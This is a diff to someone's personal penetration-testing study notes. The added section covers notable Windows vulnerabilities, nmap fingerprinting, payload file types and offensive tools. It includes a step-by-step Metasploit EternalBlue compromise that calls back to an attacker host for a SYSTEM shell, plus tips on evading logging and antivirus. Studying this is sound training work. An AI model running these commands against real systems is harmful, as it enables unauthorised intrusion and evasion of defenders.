@@ -1,6 +1,6 @@
 # Shells & Payloads
 
-> Status: 🟨 In progress (sections 1–8 of 17 filled)
+> Status: 🟨 In progress (sections 1–9 of 17 filled)
 > Date started: 2026-10-26
 > Date finished: 
 
@@ -104,6 +104,49 @@ Flag breakdown: `-p` payload (OS/arch/type), `LHOST`/`LPORT` call-back target, `
 |---|---|---|
 | **Staged** | `linux/x86/shell/reverse_tcp`, `windows/meterpreter/reverse_tcp` | sends a small stage first, which calls back to download the rest → runs shellcode. Smaller initial footprint but needs a stable connection. |
 | **Stageless** | `linux/zarch/meterpreter_reverse_tcp`, `windows/meterpreter_reverse_tcp` | whole payload sent at once. Better on low-bandwidth/high-latency links and often better for evasion (less traffic). |
+
+## Infiltrating Windows (source notes)
+**Prominent Windows exploits to know:**
+| Vuln | What it is |
+|---|---|
+| MS08-067 | Critical SMB flaw, trivial RCE (Conficker, Stuxnet used it) |
+| EternalBlue (MS17-010) | SMBv1 RCE from the Shadow Brokers/NSA dump (WannaCry, NotPetya); still common |
+| PrintNightmare (CVE-2021-34527) | Print Spooler RCE → SYSTEM via a malicious printer driver |
+| BlueKeep (CVE-2019-0708) | RDP RCE, Win2000 → Server 2008 R2 |
+| SIGRed (CVE-2020-1350) | Windows DNS flaw → Domain Admin (hits the DC's DNS) |
+| SeriousSAM (CVE-2021-36934) | Bad perms on `C:\Windows\system32\config` → read SAM via shadow copies |
+| Zerologon (CVE-2020-1472) | Netlogon crypto flaw → reset DC machine account, trivial DA |
+
+**Fingerprinting a Windows host:**
+```bash
+ping <ip>                              # TTL ~128 (or 32) = likely Windows
+sudo nmap -v -O <ip>                   # OS detection (CPE cpe:/o:microsoft:windows_10); add -A -Pn if blocked
+sudo nmap -v <ip> --script banner.nse  # banner grab open ports
+```
+
+**Windows payload file types:** **DLL** (inject/hijack → SYSTEM / UAC bypass), **Batch `.bat`** (DOS scripts, open ports / call back), **VBS** (lightweight, lives in phishing/macros), **MSI** (run with `msiexec` → elevated shell), **PowerShell** (.NET, shell + scripting).
+
+**Payload gen & transfer tools:** MSFvenom/Metasploit (OS-agnostic), PayloadsAllTheThings, Mythic C2, Nishang (offensive PowerShell), Darkarmour (obfuscated binaries). Transfer/exec: **Impacket** (psexec/smbclient/wmiexec/smbserver), **SMB** (C$/ADMIN$ shares), MSF remote exec, FTP/TFTP/HTTP(S).
+
+**Example compromise — EternalBlue via Metasploit:**
+```text
+nmap -v -A <ip>                                  # enum: finds Win Server 2016, SMB 445
+use auxiliary/scanner/smb/smb_ms17_010           # confirm vuln
+set RHOSTS <ip> ; run                            # "Host is likely VULNERABLE to MS17-010!"
+search eternal
+use exploit/windows/smb/ms17_010_psexec          # psexec variant is the most reliable
+set RHOSTS <ip> ; set LHOST <me> ; set LPORT 4444
+exploit                                           # → "SYSTEM session obtained!" → Meterpreter
+getuid                                             # NT AUTHORITY\SYSTEM
+shell                                              # drop to cmd.exe
+```
+
+**cmd vs PowerShell** (you get both on modern Windows):
+- **cmd** — original MS-DOS shell; text I/O; **no command history saved = stealthier**; use on old hosts (pre-Win7 = no PowerShell), for simple/batch/net commands, or when execution policy blocks scripts.
+- **PowerShell** — .NET objects, cmdlets, scripts; **logs history**; use for cmdlets/custom scripts, .NET interaction, cloud, aliases. Execution Policy and UAC can get in the way.
+- `C:\Windows\system32>` = cmd; `PS C:\...>` = PowerShell.
+
+**Blind spots:** WSL and PowerShell Core (on Linux) — traffic to/from WSL isn't parsed by Windows Firewall/Defender; malware uses native Python + PowerShell across both to dodge AV/EDR.
 
 ## Upgrade to a full TTY (do this immediately)
 A raw `nc` shell has no tab-complete, no arrows, no `sudo`. Upgrade:
